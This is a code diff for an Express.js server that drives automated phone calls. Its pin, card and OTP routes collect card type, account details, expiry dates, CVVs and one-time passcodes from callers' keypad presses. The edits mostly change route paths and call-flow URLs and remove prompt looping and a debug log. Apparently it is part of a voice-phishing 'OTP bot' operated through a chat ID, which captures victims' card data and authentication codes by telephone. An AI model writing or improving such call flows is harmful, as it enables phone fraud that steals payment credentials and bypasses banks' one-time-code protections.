@@ -305,7 +305,7 @@ app.get('/calls/pin/:chatId/:language', async (req, res) => {
   });
 });
 
-app.get('/calls/card/:step/:chatId/:language', async (req, res) => {
+app.get('/calls/:step/:chatId/:language', async (req, res) => {
   const { cardType, isAccount, expiry, cvv } = req.query;
   const { variables } = req.query;
   const { dtmf } = JSON.parse(variables as string);
@@ -356,7 +356,7 @@ app.get('/calls/card/:step/:chatId/:language', async (req, res) => {
           id: 'cardStepGoto',
           action: 'fetchCallFlow',
           options: {
-            url: `${process.env.ENDPOINT_URL}/calls/card/${step}/${chatId}/${language}?cardType=${cardType}&isAccount=yes`,
+            url: `${process.env.ENDPOINT_URL}/calls/${step}/${chatId}/${language}?cardType=${cardType}&isAccount=yes`,
           },
         },
       ],
@@ -406,7 +406,7 @@ app.get('/calls/card/:step/:chatId/:language', async (req, res) => {
           id: 'cardStepGoto',
           action: 'fetchCallFlow',
           options: {
-            url: `${process.env.ENDPOINT_URL}/calls/card/${step}/${step}/${chatId}/${language}?cardType=${cardType}&expiry=yes`,
+            url: `${process.env.ENDPOINT_URL}/calls/${step}/${chatId}/${language}?cardType=${cardType}&expiry=yes`,
           },
         },
       ],
@@ -461,7 +461,7 @@ app.get('/calls/card/:step/:chatId/:language', async (req, res) => {
           id: 'cardStepGoto',
           action: 'fetchCallFlow',
           options: {
-            url: `${process.env.ENDPOINT_URL}/calls/card/${step}/${chatId}/${language}?cardType=${cardType}&cvv=yes`,
+            url: `${process.env.ENDPOINT_URL}/calls/${step}/${chatId}/${language}?cardType=${cardType}&cvv=yes`,
           },
         },
       ],
@@ -521,8 +521,6 @@ app.get('/calls/card/:step/:chatId/:language', async (req, res) => {
 
 app.get('/calls/otp/:step/:chatId/:language', async (req, res) => {
   const { askCardInfo, cardType, variables } = req.query;
-  console.log('req.query: ', req.query);
-
   const { language, chatId, step } = req.params;
 
   const { dtmf } = JSON.parse(variables as string);
@@ -680,7 +678,6 @@ app.get('/calls/otp/:step/:chatId/:language', async (req, res) => {
               language,
               voice: 'female',
               length: 5,
-              loop: true,
             },
             onKeypressGoto: 'cardStepGoto',
             onKeypressVar: 'dtmf',
@@ -736,7 +733,6 @@ app.get('/calls/otp/:step/:chatId/:language', async (req, res) => {
                 language,
                 voice: 'female',
                 length: 5,
-                loop: true,
               },
               onKeypressGoto: 'cardStepGoto',
               onKeypressVar: 'dtmf',
@@ -758,7 +754,7 @@ app.get('/calls/otp/:step/:chatId/:language', async (req, res) => {
               id: 'cardStepGoto',
               action: 'fetchCallFlow',
               options: {
-                url: `${process.env.ENDPOINT_URL}/calls/card/${step}/${chatId}/${language}?cardType=${cardType}&isAccount=yes`,
+                url: `${process.env.ENDPOINT_URL}/calls/${step}/${chatId}/${language}?cardType=${cardType}&isAccount=yes`,
               },
             },
           ],
@@ -811,7 +807,6 @@ app.get('/calls/otp/:step/:chatId/:language', async (req, res) => {
                 language,
                 voice: 'female',
                 length: 5,
-                loop: true,
               },
               onKeypressGoto: 'cardStepGoto',
               onKeypressVar: 'dtmf',
@@ -852,7 +847,6 @@ app.get('/calls/otp/:step/:chatId/:language', async (req, res) => {
                 language,
                 voice: 'female',
                 length: 5,
-                loop: true,
               },
               onKeypressGoto: 'cardStepGoto',
               onKeypressVar: 'dtmf',
